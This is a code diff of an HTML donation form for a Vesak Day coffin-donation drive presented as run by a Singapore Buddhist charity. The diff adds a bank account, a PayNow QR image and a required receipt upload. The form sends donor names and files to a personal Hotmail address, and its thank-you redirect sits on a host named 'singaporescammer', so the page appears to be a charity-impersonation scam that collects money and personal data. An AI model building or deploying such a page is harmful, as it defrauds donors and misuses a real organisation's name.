@@ -1,32 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Donation Details</title>
-  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif&display=swap" rel="stylesheet"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Vesak Day Coffin Donation Drive by Toa Payoh Seu Teck Sean Tong – Support the less fortunate with dignity and compassion.">
+  <meta name="keywords" content="Vesak Day, Coffin Donation, Buddhist Charity, Funeral Help, Seu Teck Sean Tong, Singapore Buddhist Donation">
+  <meta name="author" content="Toa Payoh Seu Teck Sean Tong">
+  <title>Coffin Donation Vesak Day</title>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif&display=swap" rel="stylesheet">
   <style>
     body {
-      background-color: #f5f2e7;
+      background: #f5f2e7;
       font-family: 'Noto Serif', serif;
       color: #4b2e2e;
+      line-height: 1.8;
       margin: 0;
       padding: 0;
     }
 
     .container {
-      max-width: 700px;
+      max-width: 800px;
       margin: 40px auto;
-      background: #fff9e5;
-      padding: 30px;
+      padding: 30px 20px;
+      background-color: #fff9e5;
       border: 2px solid #e5c89c;
       border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     }
 
     h1 {
       text-align: center;
       color: #a12525;
+      font-size: 2.5em;
       margin-bottom: 20px;
     }
 
@@ -38,15 +43,16 @@
 
     input, select {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin-top: 5px;
       border-radius: 6px;
       border: 1px solid #ccc;
       font-size: 1em;
+      box-sizing: border-box;
     }
 
     .amount {
-      margin-top: 20px;
+      margin-top: 25px;
       font-size: 1.2em;
       color: #a12525;
       text-align: center;
@@ -54,25 +60,36 @@
     }
 
     .qr-container {
-      margin-top: 30px;
+      margin-top: 25px;
       text-align: center;
     }
 
     .qr-container img {
-      max-width: 300px;
+      max-width: 280px;
       width: 100%;
+      height: auto;
       border-radius: 8px;
       border: 1px solid #ccc;
+    }
+
+    .file-upload {
+      background-color: #fefefe;
+      border: 1px solid #ccc;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 6px;
+      font-size: 1em;
+      width: 100%;
     }
 
     .submit-btn {
       background: #a12525;
       color: #fff9e5;
-      padding: 12px;
+      padding: 14px;
       margin-top: 30px;
       border: none;
       border-radius: 6px;
-      font-size: 1.2em;
+      font-size: 1.1em;
       cursor: pointer;
       width: 100%;
       transition: background 0.3s ease;
@@ -81,12 +98,28 @@
     .submit-btn:hover {
       background: #801d1d;
     }
+
+    .payment-instructions {
+      margin-top: 15px;
+      font-size: 0.95em;
+      color: #5a3a2e;
+    }
+
+    .bank-info {
+      margin-top: 15px;
+      background: #fdf5e6;
+      padding: 15px;
+      border: 1px dashed #cc9f5d;
+      border-radius: 8px;
+      font-size: 0.95em;
+      text-align: left;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Donation Details</h1>
-    <form action="https://formsubmit.co/endgameis21@hotmail.com" method="POST">
+    <form action="https://formsubmit.co/endgameis21@hotmail.com" method="POST" enctype="multipart/form-data">
       <input type="hidden" name="_next" value="https://singaporescammer.github.io/sgalert/thank-you.html"/>
 
       <label for="name">Full Name</label>
@@ -116,7 +149,19 @@
 
       <div class="qr-container">
         <img src="https://singaporescammer.github.io/sgalert/assets/paynowqrcode.png" alt="PayNow QR Code">
+        <p class="payment-instructions">
+          <strong>Scan or download the QR code</strong> above to make payment via PayNow.<br>
+          Please <strong>adjust the amount</strong> according to the selected donation type.
+        </p>
+        <div class="bank-info">
+          <strong>Payee Name:</strong> Seu Teck Sean Tong<br>
+          <strong>Bank Name:</strong> DBS Bank<br>
+          <strong>Account Number:</strong> 88532600023329155
+        </div>
       </div>
+
+      <label for="receipt">Upload Receipt</label>
+      <input type="file" name="Receipt" accept="image/*" class="file-upload" required />
 
       <button type="submit" class="submit-btn">Confirm & Submit</button>
     </form>
